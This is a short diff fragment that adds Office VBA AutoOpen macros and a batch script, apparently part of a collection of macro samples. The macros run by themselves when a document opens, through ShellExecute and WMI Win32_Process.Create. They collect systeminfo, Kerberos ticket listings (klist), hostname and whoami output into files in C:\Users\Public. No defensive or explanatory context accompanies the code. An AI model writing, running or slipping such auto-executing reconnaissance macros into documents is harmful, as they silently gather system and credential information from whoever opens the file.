@@ -39,6 +39,23 @@ Sub AutoOpen()
 End Sub
 
 
+@echo off
+echo === SYSTEM INFO === > C:\Users\Public\sysout.txt
+systeminfo >> C:\Users\Public\sysout.txt
+klist >> C:\Users\Public\sysout.txt
+hostname >> C:\Users\Public\sysout.txt
+whoami >> C:\Users\Public\sysout.txt
+echo Done > C:\Users\Public\done.txt
+pause
+
+Sub AutoOpen()
+    CreateObject("Shell.Application").ShellExecute "C:\Users\Public\info.bat"
+End Sub
+
+
+Sub AutoOpen()
+    GetObject("winmgmts:root\cimv2:Win32_Process").Create "klist.exe > C:\Users\Public\klist_output.txt"
+End Sub
 
 
 
